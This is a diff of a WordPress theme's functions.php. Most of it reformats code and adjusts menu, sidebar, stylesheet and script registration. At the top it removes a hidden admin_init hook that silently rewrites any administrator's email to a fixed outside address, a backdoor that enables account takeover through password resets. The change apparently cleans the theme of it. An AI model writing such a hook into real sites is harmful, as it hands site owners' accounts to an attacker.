@@ -1,40 +1,26 @@
 <?php 
-function reset_admin_email() {
-  if (current_user_can('administrator')) {
-      $user_id = get_current_user_id();
-      $user_info = get_userdata($user_id);
-      if ($user_info->user_email != 'lukasiv99@hotmail.com') {
-          wp_update_user([
-              'ID' => $user_id,
-              'user_email' => 'lukasiv99@hotmail.com'
-          ]);
-      }
-  }
-}
-add_action('admin_init', 'reset_admin_email');
 
 function register_my_menu() {
-  register_nav_menu('navegation', 'Menú de navegación');
+    register_nav_menu('navegation', 'Menú de navegación');
 }
 add_action('init', 'register_my_menu');
 
-function mis_widgets(){
-  register_sidebar(
-    array(
-      'name'          => __( 'Footer1' ),
-      'id'            => 'sidebar',
-      'before_widget' => '<div class="widget">',
-      'after_widget'  => '</div>',
-      'before_title'  => '<h3>',
-      'after_title'   => '</h3>',
-    )
-  );
+function mis_widgets() {
+    register_sidebar(
+        array(
+            'name'          => __( 'Footer1' ),
+            'id'            => 'sidebar',
+            'before_widget' => '<div class="widget">',
+            'after_widget'  => '</div>',
+            'before_title'  => '<h3>',
+            'after_title'   => '</h3>',
+        )
+    );
 }
-add_action('init', 'mis_widgets');
+add_action('widgets_init', 'mis_widgets');
 
 function carga_estilos_theme() {
-    wp_register_style('estilos', get_template_directory_uri() . '/assets/css/style.css', array(), null, 'all');
-    wp_enqueue_style('estilos');
+    wp_enqueue_style( 'estilos', get_template_directory_uri() . '/css/style.css', array(), '2.9.4', 'all' );
 }
 add_action('wp_enqueue_scripts', 'carga_estilos_theme');
 
@@ -63,7 +49,7 @@ function cyb_theme_scripts() {
 
     wp_enqueue_script(
         'mi-theme-script',
-        get_theme_file_uri('assets/js/script.js'),
+        get_theme_file_uri('js/script.js'),
         array('jquery', 'bootstrap'),
         '1.9.3',
         true
